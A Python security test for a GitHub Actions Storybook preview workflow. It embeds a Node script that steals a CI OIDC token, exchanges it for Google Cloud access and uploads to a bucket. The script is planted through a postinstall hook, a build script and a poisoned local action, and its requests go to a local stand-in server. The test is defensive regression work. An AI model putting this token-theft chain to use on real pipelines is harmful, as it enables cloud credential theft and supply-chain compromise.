#!/usr/bin/env python3
"""Storybook preview job must not run pull request code where it can mint an OIDC token.

These tests fail while deploy-storybook-preview.yml checks out the pull request,
installs dependencies, and builds Storybook in the job that has id-token: write.
They pass once that build runs in a job without id-token permission and a later
job uploads only a downloaded artifact.
"""

from __future__ import annotations

import fnmatch
import http.server
import json
import os
import shutil
import subprocess
import tempfile
import threading
import unittest
import urllib.parse
from pathlib import Path

import yaml

REPO = Path(__file__).resolve().parents[3]
WORKFLOW = REPO / ".github" / "workflows" / "deploy-storybook-preview.yml"
YARN_RELEASE = REPO / ".yarn" / "releases" / "yarn-4.17.1.cjs"

# login-to-gcs@1f02013f3a8a0c29e3cb7dc6793158defe914569 pins this provider.
# google-github-actions/auth@7c6bc770dae815cd3e89ee6cdf493a5fab2cc093 uses it as
# the OIDC audience when the workflow does not pass one.
WIF_PROVIDER = (
    "projects/304398677251/locations/global/workloadIdentityPools/github/providers/github-provider"
)
OIDC_AUDIENCE = f"https://iam.googleapis.com/{WIF_PROVIDER}"
STS_AUDIENCE = f"//iam.googleapis.com/{WIF_PROVIDER}"
STS_URL = "https://sts.googleapis.com/v1/token"
IAM_IMPERSONATE_TMPL = (
    "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{service_account}:generateAccessToken"
)
STORAGE_UPLOAD_TMPL = "https://storage.googleapis.com/upload/storage/v1/b/{bucket}/o"
CLOUD_PLATFORM_SCOPE = "https://www.googleapis.com/auth/cloud-platform"
REQUEST_TOKEN = "placeholder-actions-id-token-request-token"
ISSUED_OIDC = "placeholder-github-oidc-token"
FEDERATED_ACCESS = "placeholder-federated-access-token"
SERVICE_ACCOUNT_ACCESS = "placeholder-service-account-access-token"


def load_workflow(path: Path) -> dict:
    data = yaml.safe_load(path.read_text())
    # PyYAML 6 treats the YAML 1.1 key "on" as boolean true.
    if True in data and "on" not in data:
        data["on"] = data.pop(True)
    return data


def path_matches(pattern: str, changed: str) -> bool:
    if pattern == changed:
        return True
    if pattern.endswith("/**"):
        prefix = pattern[: -len("/**")]
        return changed == prefix or changed.startswith(prefix + "/")
    return fnmatch.fnmatch(changed, pattern)


def trigger_matches(workflow: dict, changed_files: list[str]) -> bool:
    on = workflow.get("on") or {}
    pull = on.get("pull_request")
    if not isinstance(pull, dict):
        return False
    patterns = pull.get("paths")
    if not patterns:
        return True
    return any(path_matches(pattern, changed) for pattern in patterns for changed in changed_files)


def lookup(event: dict, inputs: dict, expr: str, steps: dict | None = None):
    expr = expr.strip()
    if expr.startswith("github."):
        cur: object = {"github": {"event": event}}
        for part in expr.split("."):
            if not isinstance(cur, dict) or part not in cur:
                return None
            cur = cur[part]
        return cur
    if expr.startswith("steps."):
        cur = {"steps": steps or {}}
        for part in expr.split("."):
            if not isinstance(cur, dict) or part not in cur:
                return None
            cur = cur[part]
        return cur
    if expr.startswith("inputs."):
        return inputs.get(expr[len("inputs.") :])
    if len(expr) >= 2 and expr[0] == expr[-1] and expr[0] in {"'", '"'}:
        return expr[1:-1]
    if expr == "true":
        return True
    if expr == "false":
        return False
    raise AssertionError(f"unsupported expression operand: {expr}")


def eval_expr(source: str, event: dict, inputs: dict, steps: dict | None = None):
    """Evaluate the GitHub expressions this workflow and its local actions use."""
    expr = source.strip()
    if expr.startswith("${{") and expr.endswith("}}"):
        expr = expr[3:-2].strip()
    return _eval_or(expr, event, inputs, steps)


def _eval_or(expr: str, event: dict, inputs: dict, steps: dict | None):
    parts = _split_top(expr, "||")
    if len(parts) == 1:
        return _eval_and(expr, event, inputs, steps)
    value = _eval_and(parts[0], event, inputs, steps)
    for part in parts[1:]:
        if value:
            return value
        value = _eval_and(part, event, inputs, steps)
    return value


def _eval_and(expr: str, event: dict, inputs: dict, steps: dict | None):
    parts = _split_top(expr, "&&")
    if len(parts) == 1:
        return _eval_compare(expr, event, inputs, steps)
    value = True
    for part in parts:
        value = bool(value) and bool(_eval_compare(part, event, inputs, steps))
    return value


def _eval_compare(expr: str, event: dict, inputs: dict, steps: dict | None):
    expr = expr.strip()
    if expr.startswith("(") and expr.endswith(")"):
        return eval_expr(expr[1:-1], event, inputs, steps)
    if " == " in expr:
        left, right = expr.split(" == ", 1)
        return lookup(event, inputs, left.strip(), steps) == lookup(event, inputs, right.strip(), steps)
    return lookup(event, inputs, expr, steps)


def _split_top(expr: str, op: str) -> list[str]:
    parts: list[str] = []
    depth = 0
    start = 0
    i = 0
    while i < len(expr):
        char = expr[i]
        if char == "(":
            depth += 1
        elif char == ")":
            depth -= 1
        elif depth == 0 and expr.startswith(op, i):
            parts.append(expr[start:i])
            i += len(op)
            start = i
            continue
        i += 1
    parts.append(expr[start:])
    return [part.strip() for part in parts]


def action_inputs(action: dict, provided: dict | None) -> dict:
    provided = provided or {}
    values = {}
    for name, spec in (action.get("inputs") or {}).items():
        if name in provided:
            values[name] = provided[name]
        elif isinstance(spec, dict) and "default" in spec:
            values[name] = spec["default"]
        else:
            values[name] = ""
    return values


def job_allows_id_token(workflow: dict, job: dict) -> bool:
    permissions = job.get("permissions")
    if permissions is None:
        permissions = workflow.get("permissions")
    if not isinstance(permissions, dict):
        return False
    return permissions.get("id-token") == "write"


def upload_service_account(job: dict) -> str | None:
    for step in job.get("steps") or []:
        uses = str(step.get("uses") or "")
        if "push-to-gcs" not in uses:
            continue
        with_ = step.get("with") or {}
        account = with_.get("service_account")
        if account:
            return str(account)
    return None


def job_bucket(job: dict) -> str | None:
    env = job.get("env") or {}
    bucket = env.get("BUCKET_NAME")
    return str(bucket) if bucket else None


class ExchangeRecord:
    def __init__(self) -> None:
        self.oidc_issued = False
        self.oidc_audience: str | None = None
        self.federated = False
        self.impersonated: str | None = None
        self.uploaded_bucket: str | None = None
        self.errors: list[str] = []


class _Handler(http.server.BaseHTTPRequestHandler):
    record: ExchangeRecord
    service_account: str
    bucket: str

    def log_message(self, fmt: str, *args) -> None:
        return

    def _json(self, code: int, payload: dict) -> None:
        body = json.dumps(payload).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_json(self) -> dict:
        length = int(self.headers.get("Content-Length") or "0")
        raw = self.rfile.read(length) if length else b""
        if not raw:
            return {}
        return json.loads(raw.decode())

    def do_GET(self) -> None:  # noqa: N802
        parsed = urllib.parse.urlparse(self.path)
        auth = self.headers.get("Authorization", "")
        if parsed.path != "/token" or auth.lower() != f"bearer {REQUEST_TOKEN}":
            self.record.errors.append(f"oidc rejected {self.path}")
            self._json(401, {})
            return
        query = urllib.parse.parse_qs(parsed.query)
        audience = (query.get("audience") or [None])[0]
        self.record.oidc_issued = True
        self.record.oidc_audience = audience
        self._json(200, {"value": ISSUED_OIDC})

    def do_POST(self) -> None:  # noqa: N802
        target = self.headers.get("X-Client-Url", "")
        body = self._read_json()
        auth = self.headers.get("Authorization", "")
        if target == STS_URL:
            expected = {
                "audience": STS_AUDIENCE,
                "grantType": "urn:ietf:params:oauth:grant-type:token-exchange",
                "requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
                "scope": CLOUD_PLATFORM_SCOPE,
                "subjectTokenType": "urn:ietf:params:oauth:token-type:jwt",
                "subjectToken": ISSUED_OIDC,
            }
            if body != expected:
                self.record.errors.append(f"sts body {body}")
                self._json(400, {})
                return
            self.record.federated = True
            self._json(200, {"access_token": FEDERATED_ACCESS})
            return
        impersonate = IAM_IMPERSONATE_TMPL.format(service_account=self.service_account)
        if target == impersonate:
            if auth != f"Bearer {FEDERATED_ACCESS}":
                self.record.errors.append("impersonation auth")
                self._json(401, {})
                return
            if body.get("scope") != [CLOUD_PLATFORM_SCOPE]:
                self.record.errors.append(f"impersonation scope {body}")
                self._json(400, {})
                return
            self.record.impersonated = self.service_account
            self._json(200, {"accessToken": SERVICE_ACCOUNT_ACCESS})
            return
        upload = STORAGE_UPLOAD_TMPL.format(bucket=self.bucket)
        parsed = urllib.parse.urlparse(target)
        if parsed.scheme + "://" + parsed.netloc + parsed.path == upload:
            if auth != f"Bearer {SERVICE_ACCOUNT_ACCESS}":
                self.record.errors.append("upload auth")
                self._json(401, {})
                return
            name = urllib.parse.parse_qs(parsed.query).get("name", [None])[0]
            if not name:
                self.record.errors.append("upload missing object name")
                self._json(400, {})
                return
            self.record.uploaded_bucket = self.bucket
            self._json(200, {"name": name, "bucket": self.bucket})
            return
        self.record.errors.append(f"unexpected {target}")
        self._json(404, {})


def serve(record: ExchangeRecord, service_account: str, bucket: str) -> tuple[http.server.ThreadingHTTPServer, str]:
    class Bound(_Handler):
        pass

    Bound.record = record
    Bound.service_account = service_account
    Bound.bucket = bucket
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Bound)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    host, port = server.server_address[:2]
    return server, f"http://{host}:{port}"


STEAL_JS = r"""
const http = require('http');
const https = require('https');

function request(target, options, body) {
  return new Promise((resolve, reject) => {
    const url = new URL(options.standin);
    const payload = body ? Buffer.from(JSON.stringify(body)) : null;
    const req = http.request(
      {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname + url.search,
        method: options.method,
        headers: Object.assign(
          {
            'X-Client-Url': target,
            Authorization: options.authorization || '',
          },
          payload
            ? {'Content-Type': 'application/json', 'Content-Length': String(payload.length)}
            : {}
        ),
      },
      (res) => {
        const chunks = [];
        res.on('data', (chunk) => chunks.push(chunk));
        res.on('end', () => {
          const text = Buffer.concat(chunks).toString('utf8');
          if (res.statusCode < 200 || res.statusCode > 299) {
            reject(new Error(target + ' HTTP ' + res.statusCode + ' ' + text));
            return;
          }
          resolve(text ? JSON.parse(text) : {});
        });
      }
    );
    req.on('error', reject);
    if (payload) req.write(payload);
    req.end();
  });
}

async function main() {
  const requestUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  const requestToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  const standin = process.env.STORYBOOK_PREVIEW_STANDIN;
  if (!requestUrl || !requestToken || !standin) return;

  const audience = process.env.STORYBOOK_PREVIEW_OIDC_AUDIENCE;
  const serviceAccount = process.env.STORYBOOK_PREVIEW_SERVICE_ACCOUNT;
  const bucket = process.env.BUCKET_NAME;
  const tokenUrl = requestUrl + '&audience=' + encodeURIComponent(audience);
  const issued = await request(tokenUrl, {
    standin: standin + '/token?' + tokenUrl.split('?')[1],
    method: 'GET',
    authorization: 'Bearer ' + requestToken,
  });

  const stsUrl = process.env.STORYBOOK_PREVIEW_STS_URL;
  const federated = await request(stsUrl, {
    standin: standin + '/sts',
    method: 'POST',
    authorization: '',
  }, {
    audience: process.env.STORYBOOK_PREVIEW_STS_AUDIENCE,
    grantType: 'urn:ietf:params:oauth:grant-type:token-exchange',
    requestedTokenType: 'urn:ietf:params:oauth:token-type:access_token',
    scope: process.env.STORYBOOK_PREVIEW_SCOPE,
    subjectTokenType: 'urn:ietf:params:oauth:token-type:jwt',
    subjectToken: issued.value,
  });

  const impersonate = process.env.STORYBOOK_PREVIEW_IMPERSONATE_URL;
  const access = await request(impersonate, {
    standin: standin + '/impersonate',
    method: 'POST',
    authorization: 'Bearer ' + federated.access_token,
  }, {scope: [process.env.STORYBOOK_PREVIEW_SCOPE]});

  const objectName = 'pr_preview/index.html';
  const upload = process.env.STORYBOOK_PREVIEW_UPLOAD_URL + '?name=' + encodeURIComponent(objectName);
  await request(upload, {
    standin: standin + '/upload',
    method: 'POST',
    authorization: 'Bearer ' + access.accessToken,
  }, {name: objectName});
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
"""


def write_pull_request_tree(root: Path, *, install_script: bool, build_script: bool, poison_setup_node: bool) -> None:
    release = root / ".yarn" / "releases"
    release.mkdir(parents=True)
    shutil.copy2(YARN_RELEASE, release / YARN_RELEASE.name)
    (root / ".yarnrc.yml").write_text(
        "enableScripts: false\nnodeLinker: node-modules\nyarnPath: .yarn/releases/yarn-4.17.1.cjs\n"
    )
    (root / "package.json").write_text(
        json.dumps(
            {
                "name": "grafana",
                "packageManager": "yarn@4.17.1",
                "workspaces": ["packages/*"],
                "scripts": {"storybook:build": "yarn workspace @grafana/ui storybook:build"},
            }
        )
    )
    ui = root / "packages" / "grafana-ui"
    ui.mkdir(parents=True)
    (ui / "steal-oidc.js").write_text(STEAL_JS)
    scripts = {
        "storybook:build": "node steal-oidc.js" if build_script else "node -e \"process.exit(0)\""
    }
    (ui / "package.json").write_text(
        json.dumps({"name": "@grafana/ui", "version": "0.0.0", "scripts": scripts})
    )
    # The install action refuses to change the lockfile. Generate it before the
    # job runs, without a lifecycle script, so the job's own install is what
    # executes postinstall. Yarn stores a successful build in install-state and
    # would otherwise skip it.
    subprocess.run(
        ["node", str(release / YARN_RELEASE.name), "install", "--inline-builds"],
        cwd=root,
        check=True,
        capture_output=True,
        text=True,
    )
    for state in root.glob(".yarn/install-state.gz"):
        state.unlink()
    if install_script:
        scripts["postinstall"] = "node steal-oidc.js"
        (ui / "package.json").write_text(
            json.dumps({"name": "@grafana/ui", "version": "0.0.0", "scripts": scripts})
        )
    for action_name in ("setup-node", "yarn-install"):
        dest = root / ".github" / "actions" / action_name
        dest.mkdir(parents=True)
        shutil.copy2(REPO / ".github" / "actions" / action_name / "action.yml", dest / "action.yml")
    if poison_setup_node:
        action = root / ".github" / "actions" / "setup-node" / "action.yml"
        parsed = yaml.safe_load(action.read_text())
        parsed["runs"]["steps"].insert(
            0,
            {"name": "Run pull request code", "shell": "bash", "run": "node packages/grafana-ui/steal-oidc.js"},
        )
        action.write_text(yaml.safe_dump(parsed, sort_keys=False))


def step_env(step: dict, event: dict, inputs: dict, inherited: dict, steps: dict) -> dict:
    env = dict(inherited)
    for key, value in (step.get("env") or {}).items():
        text = str(value)
        if "${{" in text:
            env[key] = str(eval_expr(text, event, inputs, steps))
        else:
            env[key] = text
    return env


def run_shell(script: str, cwd: Path, env: dict) -> dict[str, str]:
    github_output = cwd / ".github-output"
    github_env = cwd / ".github-env"
    github_output.parent.mkdir(parents=True, exist_ok=True)
    github_output.write_text("")
    script_path = cwd / ".github-step.sh"
    # actions/runner ScriptHandlerHelpers launches bash as:
    # bash --noprofile --norc -e -o pipefail {0}
    script_path.write_text(script)
    completed = subprocess.run(
        ["bash", "--noprofile", "--norc", "-e", "-o", "pipefail", str(script_path)],
        cwd=cwd,
        env={
            **env,
            "GITHUB_OUTPUT": str(github_output),
            "GITHUB_ENV": str(github_env),
            "GITHUB_STEP_SUMMARY": str(cwd / ".github-step-summary"),
        },
        text=True,
        capture_output=True,
    )
    if completed.returncode != 0:
        raise RuntimeError(
            f"step failed ({completed.returncode})\nscript:\n{script}\nstdout:\n{completed.stdout}\nstderr:\n{completed.stderr}"
        )
    outputs: dict[str, str] = {}
    if github_output.exists():
        for line in github_output.read_text().splitlines():
            if "=" in line:
                key, value = line.split("=", 1)
                outputs[key] = value
    return outputs


def execute_steps(
    steps: list[dict],
    cwd: Path,
    event: dict,
    inputs: dict,
    env: dict,
    *,
    checked_out: bool,
    step_outputs: dict,
) -> bool:
    for step in steps:
        condition = step.get("if")
        if condition is not None and not eval_expr(str(condition), event, inputs, step_outputs):
            continue
        uses = step.get("uses")
        if uses:
            uses = str(uses)
            if uses.startswith("actions/checkout@"):
                checked_out = True
                continue
            if uses.startswith("actions/download-artifact@") or uses.startswith("actions/upload-artifact@"):
                continue
            if uses.startswith("./"):
                if not checked_out:
                    raise AssertionError(f"{uses} ran before the pull request checkout")
                action_path = cwd / uses[2:]
                if action_path.is_dir():
                    action_path = action_path / "action.yml"
                action = yaml.safe_load(action_path.read_text())
                if True in action and "on" not in action:
                    action["on"] = action.pop(True)
                if action.get("runs", {}).get("using") != "composite":
                    raise AssertionError(f"unsupported local action {uses}")
                nested_inputs = action_inputs(action, step.get("with"))
                checked_out = execute_steps(
                    action["runs"].get("steps") or [],
                    cwd,
                    event,
                    nested_inputs,
                    env,
                    checked_out=checked_out,
                    step_outputs=step_outputs,
                )
                continue
            # Remote actions other than checkout do not execute the pull request tree.
            continue
        if "run" in step:
            outputs = run_shell(str(step["run"]), cwd, step_env(step, event, inputs, env, step_outputs))
            step_id = step.get("id")
            if step_id:
                step_outputs[str(step_id)] = {"outputs": outputs}
    return checked_out


def simulate(workflow: dict, workspace: Path, event: dict, changed_files: list[str]) -> ExchangeRecord:
    record = ExchangeRecord()
    service_account = ""
    bucket = ""
    for job in (workflow.get("jobs") or {}).values():
        service_account = upload_service_account(job) or service_account
        bucket = job_bucket(job) or bucket
    if not service_account or not bucket:
        raise AssertionError("workflow does not name the storybook preview bucket and service account")

    server, standin = serve(record, service_account, bucket)
    try:
        if not trigger_matches(workflow, changed_files):
            return record
        for job in (workflow.get("jobs") or {}).values():
            condition = job.get("if")
            if condition is not None and not eval_expr(str(condition), event, {}):
                continue
            env = os.environ.copy()
            env.pop("ACTIONS_ID_TOKEN_REQUEST_URL", None)
            env.pop("ACTIONS_ID_TOKEN_REQUEST_TOKEN", None)
            env.update({key: str(value) for key, value in (job.get("env") or {}).items()})
            env.update(
                {
                    "STORYBOOK_PREVIEW_STANDIN": standin,
                    "STORYBOOK_PREVIEW_OIDC_AUDIENCE": OIDC_AUDIENCE,
                    "STORYBOOK_PREVIEW_STS_URL": STS_URL,
                    "STORYBOOK_PREVIEW_STS_AUDIENCE": STS_AUDIENCE,
                    "STORYBOOK_PREVIEW_SCOPE": CLOUD_PLATFORM_SCOPE,
                    "STORYBOOK_PREVIEW_IMPERSONATE_URL": IAM_IMPERSONATE_TMPL.format(
                        service_account=service_account
                    ),
                    "STORYBOOK_PREVIEW_UPLOAD_URL": STORAGE_UPLOAD_TMPL.format(bucket=bucket),
                    "STORYBOOK_PREVIEW_SERVICE_ACCOUNT": service_account,
                }
            )
            if job_allows_id_token(workflow, job):
                # actions/runner ScriptHandler injects these for every script step
                # when the job connection has GenerateIdTokenUrl. GitHub documents
                # that URL as present only with id-token: write.
                env["ACTIONS_ID_TOKEN_REQUEST_URL"] = standin + "/token?"
                env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = REQUEST_TOKEN
            execute_steps(
                job.get("steps") or [],
                workspace,
                event,
                {},
                env,
                checked_out=False,
                step_outputs={},
            )
    finally:
        server.shutdown()
        server.server_close()
    return record


def assert_not_exchanged(test: unittest.TestCase, record: ExchangeRecord) -> None:
    detail = (
        f"audience={record.oidc_audience} federated={record.federated} "
        f"service_account={record.impersonated} bucket={record.uploaded_bucket} "
        f"errors={record.errors}"
    )
    test.assertFalse(record.oidc_issued, detail)
    test.assertFalse(record.federated, detail)
    test.assertIsNone(record.impersonated, detail)
    test.assertIsNone(record.uploaded_bucket, detail)
    test.assertEqual(record.errors, [])


class StorybookPreviewOidcTest(unittest.TestCase):
    def setUp(self) -> None:
        self.workflow = load_workflow(WORKFLOW)

    def _event(self, fork: bool) -> dict:
        return {
            "pull_request": {
                "number": 1,
                "head": {"ref": "feature", "repo": {"fork": fork}},
            }
        }

    def _run(self, *, fork: bool, changed: list[str], **tree_flags: bool) -> ExchangeRecord:
        root = Path(tempfile.mkdtemp(prefix="storybook-preview-oidc-"))
        self.addCleanup(shutil.rmtree, root, True)
        write_pull_request_tree(root, **tree_flags)
        return simulate(self.workflow, root, self._event(fork), changed)

    def test_same_repo_install_script_cannot_impersonate_storybook_preview(self) -> None:
        record = self._run(
            fork=False,
            changed=["packages/grafana-ui/package.json"],
            install_script=True,
            build_script=False,
            poison_setup_node=False,
        )
        assert_not_exchanged(self, record)

    def test_same_repo_storybook_build_script_cannot_impersonate_storybook_preview(self) -> None:
        record = self._run(
            fork=False,
            changed=["packages/grafana-ui/package.json"],
            install_script=False,
            build_script=True,
            poison_setup_node=False,
        )
        assert_not_exchanged(self, record)

    def test_same_repo_local_action_cannot_impersonate_storybook_preview(self) -> None:
        record = self._run(
            fork=False,
            changed=["packages/grafana-ui/src/marker.ts", ".github/actions/setup-node/action.yml"],
            install_script=False,
            build_script=False,
            poison_setup_node=True,
        )
        assert_not_exchanged(self, record)

    def test_fork_pull_request_does_not_run_the_job(self) -> None:
        record = self._run(
            fork=True,
            changed=["packages/grafana-ui/package.json"],
            install_script=True,
            build_script=True,
            poison_setup_node=True,
        )
        assert_not_exchanged(self, record)

    def test_unrelated_paths_do_not_run_the_job(self) -> None:
        record = self._run(
            fork=False,
            changed=["docs/README.md"],
            install_script=True,
            build_script=True,
            poison_setup_node=True,
        )
        assert_not_exchanged(self, record)

    def test_split_build_and_upload_jobs_do_not_exchange_the_token(self) -> None:
        fixed = yaml.safe_load(
            """
name: fixed
on:
  pull_request:
    paths:
      - 'packages/grafana-ui/**'
permissions: {}
jobs:
  build:
    if: github.event.pull_request.head.repo.fork == false
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v5
      - uses: ./.github/actions/setup-node
      - uses: ./.github/actions/yarn-install
      - run: yarn storybook:build
      - uses: actions/upload-artifact@v4
  deploy:
    needs: build
    permissions:
      contents: read
      id-token: write
    env:
      BUCKET_NAME: grafana-storybook-previews
    steps:
      - uses: actions/download-artifact@v4
      - uses: grafana/shared-workflows/actions/push-to-gcs@main
        with:
          bucket: grafana-storybook-previews
          service_account: github-gf-storybook-preview@grafanalabs-workload-identity.iam.gserviceaccount.com
"""
        )
        if True in fixed and "on" not in fixed:
            fixed["on"] = fixed.pop(True)
        root = Path(tempfile.mkdtemp(prefix="storybook-preview-fixed-"))
        self.addCleanup(shutil.rmtree, root, True)
        write_pull_request_tree(
            root, install_script=True, build_script=True, poison_setup_node=True
        )
        record = simulate(
            fixed,
            root,
            self._event(False),
            ["packages/grafana-ui/package.json"],
        )
        assert_not_exchanged(self, record)


if __name__ == "__main__":
    unittest.main()
